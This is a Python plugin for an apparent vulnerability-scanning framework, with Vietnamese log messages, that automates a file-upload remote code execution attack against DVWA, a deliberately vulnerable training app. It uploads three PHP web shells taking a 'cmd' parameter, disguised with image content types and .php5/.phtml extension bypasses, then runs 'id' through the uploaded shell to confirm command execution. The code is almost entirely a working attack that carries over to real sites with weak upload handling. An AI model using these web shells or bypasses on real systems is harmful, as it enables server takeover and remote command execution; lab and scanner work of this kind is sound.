import urllib.request
import urllib.parse
import re
from typing import Dict, Any
from plugins.base_plugin import BasePlugin

class DVWAUploadPlugin(BasePlugin):
    @property
    def METADATA(self) -> Dict[str, Any]:
        return {
            "id": "DVWA-UPLOAD",
            "name": "DVWA File Upload RCE",
            "cvss_score": 9.0,
            "service": "http",
            "vuln_type": "file_upload"
        }

    def match(self, service_info: Dict[str, Any]) -> bool:
        return service_info.get("service","") in ["http","https"]

    def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
        cookie = context.get("session_cookie","")
        if not cookie:
            return {"status": "PENDING", "evidence": "Chưa có session cookie"}

        payloads = [
            ("shell.php",     b"<?php echo shell_exec($_GET['cmd']); ?>",  "image/jpeg",      "PHP shell as JPEG"),
            ("shell.php5",    b"<?php system($_GET['cmd']); ?>",           "image/png",       "PHP5 extension bypass"),
            ("shell.phtml",   b"<?php passthru($_GET['cmd']); ?>",         "image/gif",       "phtml extension bypass"),
        ]

        upload_url = f"http://{target_ip}:{target_port}/vulnerabilities/upload/"
        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"

        for filename, shell_content, content_type, technique in payloads:
            try:
                print(f"      [Upload] [{technique}] File: {filename}")
                body = (
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="uploaded"; filename="{filename}"\r\n'
                    f"Content-Type: {content_type}\r\n\r\n"
                ).encode() + shell_content + (
                    f"\r\n--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="Upload"\r\n\r\n'
                    f"Upload\r\n--{boundary}--\r\n"
                ).encode()

                req = urllib.request.Request(upload_url, data=body)
                req.add_header("Cookie", cookie)
                req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
                resp = urllib.request.urlopen(req, timeout=5)
                response_body = resp.read().decode('utf-8')
                uploaded = "succesfully uploaded" in response_body.lower()
                print(f"      [Upload] Upload result: {'✓ success' if uploaded else '✗ failed'}")

                if uploaded:
                    shell_url = f"http://{target_ip}:{target_port}/hackable/uploads/{filename}?cmd=id"
                    print(f"      [Upload] Thử execute: {shell_url}")
                    req2 = urllib.request.Request(shell_url)
                    req2.add_header("Cookie", cookie)
                    resp2 = urllib.request.urlopen(req2, timeout=5)
                    cmd_output = resp2.read().decode('utf-8').strip()
                    print(f"      [Upload] CMD Output: {cmd_output[:80]}")

                    if "uid=" in cmd_output:
                        print(f"      [Upload] ✓ CONFIRMED RCE với technique: {technique}")
                        return {
                            "status": "CONFIRMED",
                            "evidence": (
                                f"File Upload RCE thành công.\n"
                                f"      - Technique  : {technique}\n"
                                f"      - Filename   : {filename}\n"
                                f"      - Upload URL : {upload_url}\n"
                                f"      - Shell URL  : {shell_url}\n"
                                f"      - Cookie     : {cookie}\n"
                                f"      - CMD Output : {cmd_output}"
                            )
                        }
                else:
                    print(f"      [Upload] ✗ Upload bị chặn — thử technique khác")
            except Exception as e:
                print(f"      [Upload] ✗ Error: {e}")

        return {"status": "FALSE_POSITIVE", "evidence": "Tất cả upload technique bị chặn"}
